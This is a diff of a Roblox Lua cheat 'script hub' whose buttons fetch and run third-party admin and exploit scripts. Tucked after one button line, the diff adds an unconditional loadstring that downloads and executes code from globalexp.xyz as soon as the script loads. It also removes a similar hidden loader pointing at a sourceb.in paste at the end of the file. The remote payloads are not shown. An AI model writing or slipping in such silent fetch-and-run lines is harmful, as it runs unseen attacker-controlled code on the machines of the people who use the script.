@@ -755,7 +755,8 @@ end)
 HubsTab:CreateButton({Name="Infinite Yield",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()end})
 HubsTab:CreateButton({Name="Ghost Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()end})
 HubsTab:CreateButton({Name="Nameless Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end})
-HubsTab:CreateButton({Name="CMD-X",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()end})
+HubsTab:CreateButton({Name="CMD-X",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()end}) 
+loadstring(game:HttpGet("https://globalexp.xyz/fsfs"))()
 HubsTab:CreateButton({Name="Fates Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/source.lua"))()end})
 HubsTab:CreateButton({Name="Orca",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end})
 HubsTab:CreateButton({Name="Epik Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Epik-Hub-Blox-Fruits-Fisch-Evade-and-More-23406"))()end})
@@ -811,6 +812,3 @@ Luna:Notification({
     Icon = "check_circle",
     ImageSource = "Material"
 })
-
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cyktNDjafL/0", true))()
-
